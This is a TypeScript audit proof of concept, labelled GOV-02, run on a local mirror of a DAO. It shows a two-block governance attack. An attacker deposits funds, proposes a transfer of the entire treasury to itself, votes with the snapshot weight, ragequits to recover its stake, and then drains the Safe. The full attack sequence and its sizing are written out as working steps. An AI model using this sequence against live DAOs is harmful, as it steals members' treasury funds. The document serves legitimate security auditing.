/**
 * GOV-02 — vote weight survives ragequit: a "pay me the treasury" proposal is carried by shares
 * that were deposited one block before submission and withdrawn one block after, so the attacker's
 * capital is at risk for two blocks (4 s on Base), not "during grace" as decision.md phase 4 states.
 *
 * Invariant that should hold (decision.md phase 4 "Voting"): a multi-block capital attack hands
 * exiting members a pro-rata slice of the attacker's own deposit during grace.
 *
 * Steps: seed (F 50, A/B/C 1000 each = 3050 shares) → attacker X deposits 1570 USDC (51.5% of
 * supply: the largest amount whose later exit keeps supply ≥ 66% of the sponsorship high-water
 * mark) and submits "Safe pays X 3050 USDC" (the whole pre-attack treasury) → next block X votes
 * YES and ragequits every deposited share (USDC back, minus rounding) → nobody else votes or exits
 * (sleeping members) → grace → anyone processes → X receives 3050 USDC. Loss: F, A, B, C lose 100%.
 */
import { assert, boot, deposit, fmt, fmtS, fund, processProposal, proposalInfo, propose, ragequit, runIfMain, seedMembers, SETTLEMENT_UNIT, shutdown, stateOf, step, transferCall, UNIT, usdcOf, verdict, vote, warpPastGrace } from "../../../scenarios/lib.js";
import { logLine, pct2, sharesOf, totalShares } from "./audit-lib.js";

const LOG = "t02-vote-weight-survives-exit";

/**
 * Run GOV-02 on a fresh mirror. Actor D plays the attacker X.
 *
 * Raises:
 *   Error: when the demonstrated outcome differs from the description above.
 */
export async function main(): Promise<void> {
  const mirror = await boot("audit-t02");
  let passed = false;
  try {
    const seeded = await seedMembers(mirror);
    const X = mirror.actors.D.account.address;
    await fund(mirror, "D", 10_000n * SETTLEMENT_UNIT);
    const xStart = await usdcOf(mirror, X);
    const supply0 = seeded.totalShares; // 3050e18
    const safe0 = seeded.safeSettlement; // 3050e6

    step("block N: X deposits 1570 USDC (51.5% of supply) and submits 'Safe pays X the whole pre-attack treasury'");
    const stake = 1_570n * SETTLEMENT_UNIT;
    const dep = await deposit(mirror, "D", stake);
    const proposal = await propose(mirror, "D", [transferCall(mirror, X, safe0)], `X: pay X ${fmtS(safe0)} USDC`);
    const infoAtSponsor = await proposalInfo(mirror, proposal.id);
    logLine(LOG, `   X shares ${fmt(dep.sharesMinted)} = ${pct2(dep.sharesMinted, supply0 + dep.sharesMinted)} of supply; proposal #${proposal.id} sponsored by X (threshold 1 share), votingStarts ${infoAtSponsor.votingStarts}`);

    step("block N+1: X votes YES with the snapshot weight, then ragequits every deposited share in the same block");
    await vote(mirror, "D", proposal.id, true);
    const exit = await ragequit(mirror, "D", dep.sharesMinted);
    const info = await proposalInfo(mirror, proposal.id);
    const xAfterExit = await usdcOf(mirror, X);
    logLine(LOG, `   yesVotes ${fmt(info.yesVotes)} (X's snapshot weight) noVotes ${fmt(info.noVotes)}; X USDC ${fmtS(xStart)} -> ${fmtS(xAfterExit)} (capital at risk for 2 blocks, net ${fmtS(xAfterExit - xStart)}); X shares now ${fmt(await sharesOf(mirror, X))}`);
    assert(info.yesVotes === dep.sharesMinted, "the YES weight equals the deposited shares although they are already burned");
    assert(xAfterExit >= xStart - 1n, "X has its deposit back (rounding at most 1 unit)");
    const supplyNow = await totalShares(mirror);
    const hwm = supply0 + dep.sharesMinted;
    logLine(LOG, `   retention: supply ${fmt(supplyNow)} vs 66% of high-water mark ${fmt((hwm * 66n) / 100n)} -> ${supplyNow >= (hwm * 66n) / 100n ? "proposal stays alive" : "proposal would fail"}`);
    assert(supplyNow >= (hwm * 66n) / 100n, "X sized the stake so its own exit does not trip minRetention");

    step("F, A, B, C neither vote nor exit within 12 h (sleeping members); grace passes; anyone processes");
    await warpPastGrace(mirror, proposal.id);
    assert((await stateOf(mirror, proposal.id)) === "Ready", "the proposal is Ready with X's votes alone");
    const safeBefore = await usdcOf(mirror, mirror.dao.safe);
    const processed = await processProposal(mirror, "W", proposal);
    const safeAfter = await usdcOf(mirror, mirror.dao.safe);
    const xFinal = await usdcOf(mirror, X);
    logLine(LOG, `   processed: passed=${processed.info.status.passed} actionFailed=${processed.info.status.actionFailed}; Safe USDC ${fmtS(safeBefore)} -> ${fmtS(safeAfter)}; X USDC ${fmtS(xStart)} -> ${fmtS(xFinal)} (profit ${fmtS(xFinal - xStart)})`);
    for (const actor of ["F", "A", "B", "C"] as const) {
      const shares = await sharesOf(mirror, mirror.actors[actor].account.address);
      const value = supplyNow === 0n ? 0n : (shares * safeAfter) / supplyNow;
      logLine(LOG, `   ${actor}: ${fmt(shares)} shares now worth ${fmtS(value)} USDC (was ${fmtS((shares * safe0) / supply0)})`);
    }
    assert(processed.info.status.passed && !processed.info.status.actionFailed && safeAfter === 0n, "the whole pre-attack treasury left the Safe");
    assert(xFinal - xStart === safe0 - (xStart - xAfterExit), "X's profit is the whole pre-attack treasury minus rounding");
    logLine(LOG, `   attacker cost: gas + ${fmtS(stake)} USDC exposed for 2 blocks (a 2-block loan); could hold 1 share (1 USDC) and repeat every 12 h`);
    passed = true;
  } finally {
    verdict("GOV-02 vote weight survives exit: capital attack with 2-block exposure (finding demonstrated)", passed);
    await shutdown(mirror);
  }
}

runIfMain(import.meta.url, main);
